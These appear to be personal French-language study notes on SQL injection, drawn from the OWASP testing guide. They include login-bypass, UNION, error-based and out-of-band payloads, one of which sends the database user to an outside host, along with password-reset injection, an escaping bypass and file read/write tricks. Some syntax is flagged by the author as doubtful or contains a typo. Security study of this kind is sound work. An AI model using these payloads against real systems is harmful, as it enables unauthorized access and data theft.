# SQL Injection

## Standard Exploitation

Ecrire `‘or ‘1’ = ‘1`

```sql
# Transform this request : 
SELECT * FROM Users WHERE Username=’$username’ AND Password=’$password’

# To that : 
SELECT * FROM Users WHERE Username=’admin’ AND Password=’1’ OR ‘1’ = ‘1’
```

* Penser à utiliser `LIMIT` si besoin
* On peut aussi utiliser des commentaires au lieu de reformer la string `or 1=1 --`  \(be mindful of the last space\) ou `or 1=1#`
* Stacker des requêtes en terminant la 1ère avec un `;` \(impossible si la requête est dans une fonction la préparant, et non-géré par certains systèmes de db\) : `http://www.example.com/product.php?id=10; INSERT INTO users (…)` 

## Union Exploitation

Étendre une requête SELECT avec un `UNION`

```sql
# Tansform this request :
SELECT Name, Phone, Address FROM Users WHERE Id=$id

# To that :
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

* `ALL` est utilisé pour contrecarrer `DISTINCT`
* On rajoute `1, 1` car il faut le même nombre de colonnes que le `SELECT` de base. 
  * Pour déterminer le nombre adéquat, on peut faire un `http://www.example.com/product.php?id=10 ORDER BY 10--` qui retournera soit une erreur, soit quelque chose s’il y a effectivement 10 colonnes.
* En occurrence c’est des int \(donc `1, 1`\), mais il faut que ces colonnes match aussi le types.
  * Pour ça, on peut tester en mettant d’abord null, puis en changeant le genre de données et en vérifiant l’erreur.
* Si seul le premier résultat est montré \(et donc celui de la requête véridique\), on peut fournir un id invalide, comme ça c’est le résultat de notre union qui sera remonté.

## Error Based Exploitation

Avec oracle, ce genre de payload :

```sql
|| UTL_INADDR. GET_HOST_NAME((SELECT user FROM DUAL)) --
```

Retourne ce type d'erreur : `ORA-292257: host SCOTT unknown` révélant ainsi le user.

{% hint style="info" %}
Chercher la syntaxe pour les différents DMBS
{% endhint %}

## Out of band exploitation

Avec oracle : 

```sql
|| UTL_HTTP. request(‘testerserver.com:80’ || (SELET user FROM DUAL) --
```

{% hint style="info" %}
Il manque pas une \) ? Et regarder la syntaxe pour les autres DBMS
{% endhint %}

## Stored Procedure Injection

Apparemment il existe ce genre de syntaxe :

```sql
Create procedure get_report @columnamelist varchar(7900) As Declare @sqlstring varchar(8000) Set @sqlstring = ‘ Select ‘ + @ columnamelist + ‘ from ReportTable‘ exec(@sqlstring) Go
```

Que l’on pourrait abuser avec ce genre d’input :`1 from users; update users set password = ‘password’; select *`

Mais je connais pas cette syntaxe donc je comprends pas trop.

## Insider Info

If you have an injection in a place where doing an "or 1=1" isn't useful, you may still be able to use it to show the table name & structure by injecting an sql command.

## MySQL Server Specificity

Disclaimer : y’a la même pour PL/SQL Server, Microsoft SQL Server, PostGre SQL, Miscrosoft Access et NoSQL mais vu que je les connais pas et que ça m’intéresse pas dans l’immédiat, je l’ai pas détaillé.

Fonctionnalités permettant des injections par version \(depuis y’a probablement eu de nouvelles versions\)

* From Version 4.0: UNION 
* From Version 4.1: Subqueries 
* From Version 5.0: Stored procedures, Stored functions and the view named INFORMATION\_SCHEMA 
* From Version 5.0.2: Triggers

### Single Quote Escape

MySQL permet d’escape les ', ce qui peut annuler certaines attaques quand ce n’est pas possible de contourner l’utilisation des '.

Mais dans certains cas on peut le contourner ainsi :

`password LIKE 'A%'` -&gt; `password LIKE 0x4125` -&gt; `password LIKE CHAR(65,37)`

If the db use the GBK charset \(simplified chinese\) and not the application, using `\xBF'` \(URL-encoded as `%bf%27`\) will prevent `addslashes` \(php function\) from correctly escaping the quote. \(Explained [here](http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string)\)

### Lecture / Ecriture

* On peut écrire dans une fichier avec `into outfile 'path'` \(on ne peut pas contourner les ' ' donc s’ils sont escape, ça ne marche pas\).
* On peut lire avec `load_file(‘name’)`

### Autre

* On ne peut pas accumuler les requêtes \(donc utiliser le `;` pour en commencer une nouvelle\).
* Y’a 2 genres d’utilisateurs `USER()` et `CURRENT_USER()` mais je suis pas sûr des subtilités.
* Comments : `--` \(The space is important\) ou `#`

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* Misc research

